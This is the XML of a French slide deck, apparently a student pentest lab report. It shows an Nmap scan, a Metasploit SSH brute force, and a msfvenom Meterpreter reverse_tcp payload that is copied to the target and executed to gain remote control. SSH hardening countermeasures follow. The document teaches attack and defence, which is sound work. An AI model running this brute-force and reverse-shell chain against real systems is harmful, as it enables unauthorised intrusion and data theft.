      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="9" name="Image 0" descr="/sessions/wizardly-busy-rubin/mnt/projet-pentest/Images/Acceder a DVWA via http 192-168-56-10 dvwa setup ph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1371600"/>
            <a:ext cx="7132320" cy="4846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2025  |  Ferdinand Tchadji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D.5 — DVWA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D.6  Reconnaissance  scan Nmap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: Découverte des services ouverts sur la cible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— NMAP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Nmap de la cible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d'un scan Nmap depuis Kali sur la cible 192.168.56.10.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nmap -sV -p- 192.168.56.10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scan révèle les services exposés : SSH (22), HTTP (80), FTP (21), MySQL (3306)…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port SSH (22) attire immédiatement l'attention : cible idéale pour un bruteforce.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="9" name="Image 0" descr="/sessions/wizardly-busy-rubin/mnt/projet-pentest/Images/Scanner la machine cible pour decouvrir les services ouver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1371600"/>
            <a:ext cx="7132320" cy="4846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D.6 - RECONNAISSANCE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D.7  Lancement de Metasploit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5.1 : Démarrage du framework d'exploitation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5.1 — METASPLOIT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msfconsole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de Metasploit Framework via la commande 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msfconsole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 charge sa base d'exploits, payloads et modules auxiliaires. C'est le cœur de l'attaque qui suit.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="9" name="Image 0" descr="/sessions/wizardly-busy-rubin/mnt/projet-pentest/Images/Lancer metasploi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2237014"/>
            <a:ext cx="7132320" cy="212271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D.7 - BRUTE FORCE SSH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D.7  Chargement du module ssh_login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de la </a:t>
            </a:r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auxiliary/scanner/ssh/ssh_login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5.2 — MODULE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SSH brute force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du module dédié au bruteforce SSH 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auxiliary/scanner/ssh/ssh_login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RHOSTS 192.168.56.10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RPORT 22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module tentera des paires login/password jusqu'à trouver des credentials valides.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="9" name="Image 0" descr="/sessions/wizardly-busy-rubin/mnt/projet-pentest/Images/Charger le module brute force SSH et configurer la cible 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2480" y="2148840"/>
            <a:ext cx="7132320" cy="246561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D.7 - BRUTE FORCE SSH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D.7  Configuration du dictionnaire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USER_FILE &amp; PASS_FILE  wordlists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5.3 — WORDLIST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Dictionnaires chargés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des listes de mots utilisées pour l'attaque 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USER_FILE /usr/share/wordlists/users.txt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PASS_FILE /usr/share/wordlists/passwords.txt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dictionnaire contient 123456  qui est précisément le mot de passe de notre utilisateur faible.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="9" name="Image 0" descr="/sessions/wizardly-busy-rubin/mnt/projet-pentest/Images/Configurer le dictionnaire d attaque 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1776140"/>
            <a:ext cx="7132320" cy="353431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D.7 - BRUTE FORCE SSH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D.7  Configuration finale de l'attaque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options  vérification avant exécution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5.4 — CONFIG OK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Attaque configurée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de la configuration via 'show options' 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RHOSTS, RPORT, USER_FILE, PASS_FILE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STOP_ON_SUCCESS : true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THREADS : multiples pour accélérer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est prêt  l'attaque va être lancée par 'run'.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="9" name="Image 0" descr="/sessions/wizardly-busy-rubin/mnt/projet-pentest/Images/Configuration totale de l attaque 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1371600"/>
            <a:ext cx="7132320" cy="4846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D.7 - BRUTE FORCE SSH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D.7  Mot de passe trouvé  123456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5.5 : Résultat de l'attaque par dictionnaire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5.5 — SUCCESS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trouvés !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L'attaque par dictionnaire a réussi.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 affiche [+] Success: 'user:123456'.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session est même automatiquement ouverte par Metasploit.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L'attaquant détient désormais des credentials SSH valides.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="9" name="Image 0" descr="/sessions/wizardly-busy-rubin/mnt/projet-pentest/Images/Resultat attendu mot de passe 123456 trouve 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1371600"/>
            <a:ext cx="7132320" cy="4846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D.7 - BRUTE FORCE SSH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D.8  Connexion SSH avec les credentials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6.1 : Étape 3 de l'énoncé : obtenir la preuve de réussite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6.1 — SSH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SSH obtenu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Kali, connexion SSH classique avec les credentials trouvés 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ssh user@192.168.56.10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 : 123456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L'authentification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réussit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l'attaquant est désormais shell sur la cible.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="9" name="Image 0" descr="/sessions/wizardly-busy-rubin/mnt/projet-pentest/Images/Depuis kali connexion avec les credentials trouves pendant l attaqu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1371600"/>
            <a:ext cx="7132320" cy="4846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D.8 - ACCÈS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D.8  Vérification des droits utilisateur faible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/ </a:t>
            </a:r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whoami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droits utilisateurs limités au départ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6.2 — DROITS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user obtenus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des privilèges obtenus après la connexion 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whoami → user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→ uid=1001(user) gid=1001(user)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local mais droits limités. La prochaine phase visera l'élévation de privilèges via Meterpreter.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="9" name="Image 0" descr="/sessions/wizardly-busy-rubin/mnt/projet-pentest/Images/Verifier les droits obtenus apres connexion ssh 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1371600"/>
            <a:ext cx="7132320" cy="440055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D.8 - ACCÈS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D.9  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="26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</a:t>
            </a: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Meterpreter pour aller plus loin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7.1 : D'un shell standard à un contrôle complet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7.1 — POSTEXPLOIT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Meterpreter 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shell SSH classique ne donne qu'un terminal limité.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Meterpreter (Metasploit) offre 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gestion de fichiers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capture d'écran à distance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keylogger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migration de processus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élévation et persistance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couteau suisse de la post-exploitation.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="9" name="Image 0" descr="/sessions/wizardly-busy-rubin/mnt/projet-pentest/Images/Acces plus avances avec payload dans meterpret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1691640"/>
            <a:ext cx="7132320" cy="378822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D.9 - MÉTERPRETER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D.9  Création du payload msfvenom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7.2 : Génération d'un binaire reverse shell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7.2 — PAYLOAD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généré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un autre terminal de Kali, génération d'un payload Meterpreter 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msfvenom -p linux/x64/meterpreter/reverse_tcp \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LHOST=192.168.56.20 LPORT=4444 \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-f elf -o payload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binaire 'payload', une fois exécuté sur la cible, ouvrira une connexion sortante vers Kali.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="9" name="Image 0" descr="/sessions/wizardly-busy-rubin/mnt/projet-pentest/Images/Creation du payload sur un autre terminal de kali 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1575707"/>
            <a:ext cx="7132320" cy="370658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D.9 - MÉTERPRETER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D.9  Transfert du payload via SSH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déploiement du binaire sur la cible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7.3 — TRANSFER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déposé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du payload vers la cible via la session SSH active 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scp payload user@192.168.56.10:/tmp/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canal de transfert légitime (SSH) est réutilisé contre la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l'attaquant exploite ce qu'il vient d'acquérir.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="9" name="Image 0" descr="/sessions/wizardly-busy-rubin/mnt/projet-pentest/Images/Transferer le payload sur la cible via SSH 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2480" y="2524396"/>
            <a:ext cx="7132320" cy="133894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D.9 - MÉTERPRETER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D.9  Exécution du payload sur la cible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+x &amp;&amp; ./payload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7.4 — RUN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exécuté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Côté cible (via SSH), exécution du payload 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chmod +x /tmp/payload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/tmp/payload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binaire se connecte immédiatement à Kali sur le port 4444 où Metasploit attend (multi/handler).</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="9" name="Image 0" descr="/sessions/wizardly-busy-rubin/mnt/projet-pentest/Images/Lancement du payoad sur la machine cibl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2480" y="2726872"/>
            <a:ext cx="7132320" cy="12573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D.9 - MÉTERPRETER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D.9  Session Meterpreter ouverte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[*] Meterpreter session 1 opened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7.5 — SESSION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ouverte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Côté Kali, le handler reçoit la connexion entrante et ouvre une session Meterpreter complète.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L'attaquant dispose maintenant d'un canal de commande puissant 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shell, screenshot, getuid, sysinfo…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machine cible est sous contrôle.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="9" name="Image 0" descr="/sessions/wizardly-busy-rubin/mnt/projet-pentest/Images/Session overte apres lancement du payload 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2480" y="2645228"/>
            <a:ext cx="7132320" cy="156754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D.9 - MÉTERPRETER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D.9  Manipulation à distance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Meterpreter sur la cible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7.6 — CONTROL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distant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des capacités Meterpreter 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sysinfo : empreinte système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getuid : identité du compte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ls / cd / cat : exploration du filesystem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download / upload : exfiltration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L'attaquant peut piloter la cible comme s'il était physiquement présent.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="9" name="Image 0" descr="/sessions/wizardly-busy-rubin/mnt/projet-pentest/Images/Manipulation de la machine cible a distance via meterpret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1534886"/>
            <a:ext cx="7132320" cy="418011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D.9 - MÉTERPRETER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D.10  Preuve totale de compromission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de </a:t>
            </a:r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l'énoncé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Preuve que l'attaque a bel et bien réussi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64008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73152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</a:rPr>
              <a:t>Confidentialité, intégrité et disponibilité  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1E293B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>compromises  l'attaquant détient le contrôle de la machine cible.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="8" name="Image 0" descr="/sessions/wizardly-busy-rubin/mnt/projet-pentest/Images/Preuve totale de compromision de l attaqu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194560"/>
            <a:ext cx="7772400" cy="411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03920" y="2194560"/>
            <a:ext cx="3200400" cy="411480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7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8686800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</a:rPr>
              <a:t>BILAN DE L'ATTAQUE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0" y="2788920"/>
            <a:ext cx="2926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C2626"/>
                </a:solidFill>
              </a:rPr>
              <a:t>[+]</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Credentials SSH compromis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C2626"/>
                </a:solidFill>
              </a:rPr>
              <a:t>[+]</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Shell distant établi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C2626"/>
                </a:solidFill>
              </a:rPr>
              <a:t>[+]</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Payload déposé &amp; exécuté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C2626"/>
                </a:solidFill>
              </a:rPr>
              <a:t>[+]</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Session Meterpreter active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C2626"/>
                </a:solidFill>
              </a:rPr>
              <a:t>[+]</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Lecture/écriture FS cible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C2626"/>
                </a:solidFill>
              </a:rPr>
              <a:t>[+]</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Persistance possible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0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D.10 - PREUVE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D'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5029200" y="2560320"/>
            <a:ext cx="73152" cy="1828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30352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D'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03520" y="30175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Contre-mesures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303520" y="41148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de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" i="1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l'énoncé</a:t>
            </a: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Durcissement complet contre cette attaque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Contre-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="26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</a:t>
            </a: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vue d'ensemble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Défense en profondeur : ralentir, bloquer et tracer toute tentative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37160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6304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Fail2Ban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194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Détection comportementale &amp; bannissement IP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46304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4343400" y="1463040"/>
            <a:ext cx="137160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4617720" y="1645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4924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Clés SSH uniquement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49240" y="2194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Suppression de l'authent par mot de passe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146304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6" name="Shape 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8229600" y="1463040"/>
            <a:ext cx="137160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8503920" y="1645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23544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Port SSH non-standard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35440" y="2194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22 → 2222 (réduction du bruit)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137160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731520" y="32461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463040" y="3291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Désactivation root login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Aucun compte privilégié direct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43400" y="306324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6" name="Shape 24"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4343400" y="3063240"/>
            <a:ext cx="137160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4617720" y="32461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349240" y="3291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Pare-feu UFW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4924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Filtrage strict des flux entrants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0" y="306324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1" name="Shape 29"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8229600" y="3063240"/>
            <a:ext cx="137160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Text 30"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8503920" y="32461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9235440" y="3291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Politique pwquality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23544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Mots de passe forts obligatoires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617720"/>
            <a:ext cx="11247120" cy="155448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Text 34"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="68580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59669"/>
                </a:solidFill>
              </a:rPr>
              <a:t>PHILOSOPHIE DÉFENSIVE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5800" y="512064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Aucune contre-mesure n'est suffisante seule. La défense en profondeur combine plusieurs couches indépendantes : rendre l'attaque plus lente (Fail2Ban), plus complexe (clés SSH, port modifié), plus tracée (logs) et impossible sans des privilèges admin physiques (politique de mot de passe).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Text 37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CONTRE-MESURES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1.1  Installation de Fail2Ban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cible Ubuntu : apt install fail2ban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CONTRE-MESURE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Fail2Ban installé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Fail2Ban surveille les logs SSH et bannit automatiquement les IPs qui multiplient les échecs d'authentification.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sudo apt update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sudo apt install fail2ban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ligne de défense contre le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bruteforce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sans elle, l'attaque précédente aurait été triviale.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="9" name="Image 0" descr="/sessions/wizardly-busy-rubin/mnt/projet-pentest/Images/Contre mesures/Sur ubuntu machine cible, installer fail2Ba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2480" y="2130878"/>
            <a:ext cx="7132320" cy="259624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- FAIL2BAN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1.2  Configuration jail.local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du fichier de configuration de Fail2Ban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CONTRE-MESURE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Édition jail.local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de jail.conf en jail.local pour personnaliser sans écraser les valeurs par défaut.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 /etc/fail2ban/jail.conf /etc/fail2ban/jail.local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nano /etc/fail2ban/jail.local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pratique Fail2Ban : jail.local prévaut sur jail.conf et survit aux mises à jour.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="9" name="Image 0" descr="/sessions/wizardly-busy-rubin/mnt/projet-pentest/Images/Contre mesures/entrer dans le fichier de configuration de fail2ban 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2480" y="2971800"/>
            <a:ext cx="7132320" cy="1143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- FAIL2BAN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1.3  Paramétrage anti-bruteforce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maxretry, bantime, findtime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CONTRE-MESURE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SSH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de la jail SSH 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[sshd]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= true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= ssh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maxretry = 3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bantime = 1h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findtime = 10m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échecs en 10 minutes → 1h de bannissement.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="9" name="Image 0" descr="/sessions/wizardly-busy-rubin/mnt/projet-pentest/Images/Contre mesures/Configurer fail 2 ban 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2480" y="1975757"/>
            <a:ext cx="7132320" cy="242479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- FAIL2BAN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1.4  Relance des services Fail2Ban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restart fail2ban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CONTRE-MESURE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Fail2Ban actif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 la configuration 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systemctl restart fail2ban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systemctl status fail2ban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fail2ban-client status sshd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protection est active toute tentative de bruteforce sera détectée et bloquée automatiquement.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="9" name="Image 0" descr="/sessions/wizardly-busy-rubin/mnt/projet-pentest/Images/Contre mesures/Relancer les services fail2ban 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0" y="2057400"/>
            <a:ext cx="7132320" cy="2743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- FAIL2BAN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2  Authentification par clés SSH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des mots de passe clés publiques uniquement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CONTRE-MESURE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 SSH uniquement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d'une paire de clés côté Kali (ssh-keygen) et dépôt de la clé publique sur la cible.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dans /etc/ssh/sshd_config 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PubkeyAuthentication yes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attaquant ne peut plus faire de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bruteforce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il faudrait dérober la clé privée elle-même.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="9" name="Image 0" descr="/sessions/wizardly-busy-rubin/mnt/projet-pentest/Images/Contre mesures/Durcissement en autorisant seulement les cles SS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2480" y="2423160"/>
            <a:ext cx="7132320" cy="220925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- SSH HARDENING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3  Changement du port SSH (2222)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22 → 2222 : réduction du bruit &amp; des scanners automatiques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CONTRE-MESURE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SSH personnalisé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du port d'écoute SSH dans sshd_config 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 2222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n'est pas de la sécurité par obscurité au sens strict  c'est un filtre passif qui élimine 95% du bruit des scanners automatiques visant le port 22.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Pensez à mettre à jour les règles UFW en conséquence.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="9" name="Image 0" descr="/sessions/wizardly-busy-rubin/mnt/projet-pentest/Images/Contre mesures/Changer le port par defaut a 222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2645229"/>
            <a:ext cx="7132320" cy="146957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- SSH HARDENING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4  Désactivation des mots de passe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PasswordAuthentication no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CONTRE-MESURE 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par mot de passe off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Désactivation explicite de l'authentification par mot de passe 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PasswordAuthentication no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ChallengeResponseAuthentication no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si un utilisateur définit un mot de passe faible, il ne pourra pas servir à se connecter en SSH  le bruteforce devient inutile.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="9" name="Image 0" descr="/sessions/wizardly-busy-rubin/mnt/projet-pentest/Images/Contre mesures/Desactiver authentification par mot de pass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0" y="2706460"/>
            <a:ext cx="7132320" cy="167367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- SSH HARDENING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5  Désactivation du root login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PermitRootLogin no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CONTRE-MESURE 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login désactivé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Interdiction explicite de la connexion directe en tant que root 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PermitRootLogin no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 : pour escalader, un attaquant doit d'abord compromettre un compte utilisateur, puis utiliser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ce qui ajoute une trace dans les logs et un obstacle.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="9" name="Image 0" descr="/sessions/wizardly-busy-rubin/mnt/projet-pentest/Images/Contre mesures/Desactiver le root login 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2480" y="2506436"/>
            <a:ext cx="7132320" cy="160836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- SSH HARDENING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6  Pare-feu UFW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strict des flux entrants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CONTRE-MESURE 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configuré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et configuration du pare-feu UFW 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ufw default deny incoming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ufw default allow outgoing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ufw allow 2222/tcp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ufw enable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ports non explicitement autorisés sont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fermés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 surface d'attaque est minimisée.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="9" name="Image 0" descr="/sessions/wizardly-busy-rubin/mnt/projet-pentest/Images/Contre mesures/Configuration du parefeu UFW dans la cibl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1371600"/>
            <a:ext cx="7132320" cy="4846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- PARE-FEU UFW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7.1  Politique de mots de passe libpam-pwquality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du module PAM de qualité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CONTRE-MESURE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libpam-pwquality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de libpam-pwquality, le module PAM qui contrôle la qualité des mots de passe.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apt install libpam-pwquality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module permet de définir des règles strictes (longueur, classes de caractères, distance avec l'ancien mot de passe…).</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="9" name="Image 0" descr="/sessions/wizardly-busy-rubin/mnt/projet-pentest/Images/Contre mesures/Installation libpam pwquality pour les politiques de mots de passe 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0" y="2514600"/>
            <a:ext cx="7132320" cy="178797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- PWQUALITY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7.2  Durcissement /etc/security/pwquality.conf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: longueur, majuscules, chiffres, symboles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CONTRE-MESURE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forte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de la politique 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minlen = 12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dcredit = -1 (au moins un chiffre)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ucredit = -1 (majuscule)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lcredit = -1 (minuscule)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ocredit = -1 (symbole)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retry = 3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 de passe comme '123456' devient impossible à enregistrer.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="9" name="Image 0" descr="/sessions/wizardly-busy-rubin/mnt/projet-pentest/Images/Contre mesures/Durcir les politques de mot de passe dans le ficher de configuration pwquality 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1371600"/>
            <a:ext cx="7132320" cy="4846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Pentest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6565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- PWQUALITY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914400" y="731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059669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Un système faible se compromet en quelques minutes.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BD5E1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Un système durci résiste à des heures de tentatives automatisées.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5029200" cy="3108960"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1E293B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1097280" y="2971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C2626"/>
                </a:solidFill>
              </a:rPr>
              <a:t>AVANT - VULNÉRABLE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38328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SSH avec mots de passe faibles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Root login autorisé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Aucune protection bruteforce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Tous les ports ouverts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Politique pwd inexistante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834640"/>
            <a:ext cx="5029200" cy="3108960"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1E293B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6400800" y="2971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59669"/>
                </a:solidFill>
              </a:rPr>
              <a:t>APRÈS - DURCI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338328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Authentification par clés SSH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Root login désactivé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Fail2Ban + UFW actifs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Port SSH = 2222 + UFW restrictif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Politique pwquality stricte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Merci de votre attention.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4076</Words>
  <Application>Microsoft Office PowerPoint</Application>
  <PresentationFormat>Widescreen</PresentationFormat>
  <Paragraphs>811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Pentest - Attaque &amp; Contre-mesures</dc:title>
  <dc:subject>PptxGenJS Presentation</dc:subject>
  <dc:creator>Projet Pentest</dc:creator>
  <cp:lastModifiedBy>NKOM TAKEU Guy</cp:lastModifiedBy>
  <cp:revision>124</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2026-05-11T20:29:33Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-05-11T21:02:56Z</dcterms:modified>
</cp:coreProperties>
</file>